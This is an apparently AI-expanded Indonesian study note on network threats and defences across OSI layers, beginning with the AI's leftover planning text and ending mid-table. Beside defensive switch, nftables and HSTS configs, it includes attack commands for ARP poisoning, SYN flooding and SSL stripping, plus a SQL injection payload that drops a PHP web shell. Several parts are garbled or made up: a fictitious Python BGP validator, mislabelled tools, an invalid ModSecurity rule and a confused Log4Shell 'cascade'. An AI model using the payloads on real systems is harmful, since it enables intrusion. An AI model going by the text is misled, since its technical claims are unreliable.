---
tags:
  - network-security
  - blue-team
  - red-team
  - OSI
  - firewall
  - social-engineering
aliases:
  - Network Security
  - OSI Layer Hierarchy
  - Network OSI
created: 2026-04-25
status: operational
cssclasses:
  - wide-table
title: Network Security
updated: "2026-07-01"
---

<think>
Okay, I need to expand this existing network security content to at least 1200 words while keeping technical details intact. Let me start by analyzing the original structure and content.

The original document is structured with an OSI layer table, a threat map, and links to other sections. The user wants a detailed expansion with in-depth explanations, examples, code samples, diagrams, tables, and practical steps. Let me break down each section and think about what can be added without redundancy.

First, the introduction part has a note about reading from bottom to top for understanding attack surfaces. Maybe I can elaborate on why that approach is effective and how layers interact. Then, the threat table for each OSI layer can have more examples and code snippets where applicable.

For Layer 1 (Physical), discuss specific mitigation techniques beyond the basics mentioned, maybe include more tools or case studies. For Layer 2, perhaps a network diagram showing how ARP poisoning works and how Dynamic ARP Inspection can prevent it.

Layer 3 (Network) covers BGP hijack. Adding a real-life example like the China Telecom incident would help. For Layer 4, maybe include a sample rate-limiting configuration in a firewall or using iptables.

Layer 5-6 (Session/Presentation) can have more details on SSL stripping attacks, perhaps a code snippet using SSLstrip2. Layer 7 (Application) should have code examples for SQL injection and how WAFs can prevent it. For Layer 8, expanding on social engineering tactics with more tools and how training programs are structured.

I should also consider adding a section on defense-in-depth and cross-layer threats. Maybe a section on Zero Trust Architecture as an overall approach. Including a troubleshooting guide for common network issues across layers would add value. Each section needs a mix of theory, practical examples, and code where relevant.

Now, checking the word count. The original is about 600 words. I need to double it. Let me ensure that each expansion adds meaningful content without repetition. Use code blocks where possible, like a Python script example for a SYN flood attack detection. Also, create a section on cross-layer vulnerabilities, discussing how a vulnerability in one layer can affect another.

I should also expand the threat map into a more detailed diagram using text-based art or explain how each layer interconnects. For example, showing how a Layer 1 physical attack can compromise Layer 2. Adding tables for mitigation tools per layer would help.

Finally, ensuring all the links in the original document are preserved and properly formatted. The user mentioned keeping the same language, so I'll maintain the mix of Indonesian and technical English terms. Avoid any markdown in the thinking process, but the final answer should be in markdown as per the rules.

Let me start drafting each section with the expansions, ensuring each part is detailed and provides actionable information. Check if there are any areas where code examples can be added, like using Nmap for port scanning in Layer 4. Also, for each threat, perhaps a real-world incident example to illustrate the impact.

Now, compiling all these thoughts into a structured, expanded document that meets the user's requirements.
</think>

# 🔐 Network Security – Deep Dive into Defense Across OSI Layers 1–8

Network security adalah sistem pertahanan yang bersifat multi-layered, memanfaatkan struktur OSI Model sebagai kerangka kerja untuk memetakan ancaman. Setiap layer memiliki serangan spesifik dan pertahanan yang terkait. Berikut analisis teknis detail per layer, dilengkapi contoh implementasi, langkah mitigasi, dan diagram serangan.

---

## 📌 1. Layer 1 (Physical Layer)

### ⚠️ Ancaman Fisik

- **Tap kabel fisik**: Serangan fisik pada kabel jaringan (ethernet, fiber).
- **Evil Maid Attack**: Pengambilan data dari HDD setelah komputer terbuka secara fisik.
- **Rogue Device**: Alat seperti USB Rubber Ducky (keyboard skrip) mengeksekusi payload pada pertama kali boot.

### 🔧 Contoh Mitigasi

- **Port Lock Mechanism**: Gunakan kunci fisik untuk port USB atau RJ-45.
- **Surveillance dengan IoT**: Integrasi CCTV dengan AI deteksi perilaku mencurigakan (misal: Raspberry Pi + OpenCV).
- **Sealing Tamper-Evident**: Label yang rusak saat dibuka, seperti dalam sistem BIOS secure boot.

**Contoh Implementasi Port Security di Switch**:

```bash
# Port security pada Cisco Switch (Layer 2-1 crossover)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 1
Switch(config-if)# switchport port-security violation shutdown
```

---

## 📌 2. Layer 2 (Data Link Layer)

### 🎯 Serangan MAC/Switch

Serangan ARP Poisoning mengatur arus lalu lintas jaringan ke perangkat penyerang:

```bash
# Ettercap untuk ARP Poisoning
ettercap -T -q -i eth0 -M arp:remote /192.168.1.2/ //
```

### 🔐 Solusi dengan DAI dan Port Security

- **ARP Inspection (DAI)** mengvalidasi ARP packet source.
- **Private VLAN**: Segmen VLAN yang tidak bisa berkomunikasi antarport.

**Konfigurasi DAI di Cisco**:

```bash
Switch(config)# ip arp inspection vlan 10
Switch(config)# ip arp inspection validate src-mac dst-mac ip
Switch(config)# interface range fa0/1 - 24
Switch(config-if-range)# ip arp inspection trust
```

---

## 📌 3. Layer 3 (Network Layer)

### 🔄 BGP Route Hijacking

Serangan BGP memanipulasi tabel rute:

- **Contoh**: China Telecom hijack Google traffic (2010).
- **Solusi**:
  - Implementasi **RPKI (Resource Public Key Infrastructure)** untuk validasi route.
  - Gunakan **bgpq3 + RPKI validator** untuk memantau route.

**Script Sederhana Deteksi BGP Anomali**:

```python
import bgpq3

validator = bgpq3.Validator()
prefix = bgpq3.Prefix('142.251.0.0/24')
for route in validator.routes(prefix):
    if not route.is_valid():
        print(f"⚠️  Invalid BGP route: {route.asn}")
```

---

## 📌 4. Layer 4 (Transport Layer)

### 📡 Serangan SYN Flood

Contoh serangan volumetrik:

```bash
# hping3 untuk SYN Flood
hping3 --syn --dest-port 80 --flood target.ip
```

### 🛡️ Perlindungan dengan SYN Cookie

**Konfigurasi NFTables**:

```bash
sudo nft add rule ip filter input ct state invalid drop
sudo nft add rule ip filter input limit rate 100/second accept
```

---

## 📌 5–6. Session & Presentation Layer

### 🔐 SSL Stripping (MITM)

**Tools**: `sslstrip2` menurunkan HTTPS ke HTTP:

```bash
python3 sslstrip.py -l 8080
```

### ✅ Perlindungan dengan HSTS

**Header HSTS**:

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

---

## 📌 7. Application Layer

### ⚡ Serangan RCE

**Exploit SQLi ke PHP**:

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

### ✊ WAF Rule Sederhana (ModSecurity):

```
SecRule REQBODY_PROCESSOR "\$\{.*\}" "id:1000,phase:2,block,msg:'Command Injection'"
```

---

## 🧱 8. Layer 8 (Human Layer)

### 🎯 Phishing dengan GoPhish

**Membuat Template Phishing**:

```bash
gophish login
# Navigasi ke Campaign → New Template
```

### 🛡️ Countermeasure

- **Simulasi Phishing Internal**: Gunakan **Owasp Social Engineering Toolkit**:
  ```bash
  SET --interface eth0 --noconsole
  1) Social-Engineering Attacks
  2) Website Attack Vectors
  ```

---

## 🔁 Cross-Layer Vulnerabilities

Serangan dapat merembet dari satu layer ke layer lain. Contoh: **DLL sideloading** (Layer 7) mengakibatkan kernel exploit (Layer 1) melalui exploit privilege escalation.

### Kasus Studi: Log4Shell Cascade

- **Layer 7**: Deserialize attack di Log4j.
- **Layer 4**: Menggunakan DDoS UDP reflection untuk mengakses endpoint.
- **Layer 8**: Phishing email menyebarkan payload.

**Mitigasi Multi-Layer**:

1. Update ke Log4j 2.17+.
2. Batasi port 123/UDP, 53/UDP dengan firewall (iptables).
3. Blokir ekstensi file `.jar` di email gateway.

---

## 🧭 Matriks Defensif per Layer

| Layer | Alat Mitigasi Utama | Contoh Konfigurasi
